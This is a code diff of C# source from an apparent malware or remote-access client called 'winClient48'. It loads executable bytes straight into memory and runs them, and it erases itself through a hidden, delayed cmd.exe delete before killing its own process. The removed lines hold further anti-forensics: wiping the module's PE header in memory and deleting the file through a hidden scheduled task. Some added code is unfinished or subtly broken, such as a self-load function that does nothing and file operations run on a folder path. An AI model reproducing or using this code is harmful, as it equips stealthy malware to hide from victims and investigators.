@@ -117,8 +117,6 @@ namespace winClient48
         /// </summary>
         public void fnLoadToMemory(string[] alpArgs, byte[] abExeBytes)
         {
-            MessageBox.Show("X");
-
             Assembly loaded = Assembly.Load(abExeBytes);
             MethodInfo entry = loaded.EntryPoint;
             object instance = null;
@@ -126,64 +124,25 @@ namespace winClient48
                 instance = loaded.CreateInstance(entry.Name);
 
             entry.Invoke(instance, new object[] { alpArgs });
-
-            Environment.Exit(0);
         }
 
-        public (int, string) SelfDestroy(string szPath)
+        public void fnLoadItselfIntoMemory()
         {
-            int nCode = 0;
-            string szMsg = string.Empty;
+            byte[] abData = File.ReadAllBytes(Application.StartupPath);
 
-            try
+        }
+
+        public void fnSelfDestroy(string szPath)
+        {
+            Process.Start(new ProcessStartInfo()
             {
-                if (!File.Exists(Process.GetCurrentProcess().MainModule.FileName)) //Fileless
-                {
-                    Process.GetCurrentProcess().Kill();
-                }
-                else if (Assembly.GetEntryAssembly() == null) //DLL
-                {
-                    const uint PAGE_READWRITE = 0x04;
-                    const uint dwSize = 0x1000;
-                    IntPtr lpBaseAddress = Process.GetCurrentProcess().MainModule.BaseAddress;
+                Arguments = $"/C choice /C Y /N /D Y /T 5 & Del \"{Application.StartupPath}\"",
+                WindowStyle = ProcessWindowStyle.Hidden,
+                CreateNoWindow = true,
+                FileName = "cmd.exe",
+            });
 
-                    WinAPI.VirtualProtect(lpBaseAddress, (UIntPtr)dwSize, PAGE_READWRITE, out uint oldProtect);
-                    for (int i = 0; i < 0x1000; i++)
-                        Marshal.WriteByte(lpBaseAddress + i, 0);
-                }
-                else
-                {
-                    string szExePath = Application.ExecutablePath;
-                    string szTaskName = Guid.NewGuid().ToString("N");
-                    string szCmd = $"cmd.exe /C timeout 3 && del \"{szExePath}\" && ";
-
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = "schtasks",
-                        Arguments = $"/Create /SC ONCE /TN \"{szTaskName}\" /TR \"{szCmd}\" /ST {DateTime.Now.AddMinutes(1).ToString("HH:mm")} /F",
-                        UseShellExecute = false,
-                        CreateNoWindow = true,
-
-                    })?.WaitForExit();
-
-                    Process.Start(new ProcessStartInfo
-                    {
-                        FileName = "schtasks",
-                        Arguments = $"/Run /TN \"{szTaskName}\"",
-                        UseShellExecute = false,
-                        CreateNoWindow = true,
-
-                    })?.WaitForExit();
-                }
-
-                nCode = 1;
-            }
-            catch (Exception ex)
-            {
-                szMsg = ex.Message;
-            }
-
-            return (nCode, szMsg);
+            Process.GetCurrentProcess().Kill();
         }
     }
 }
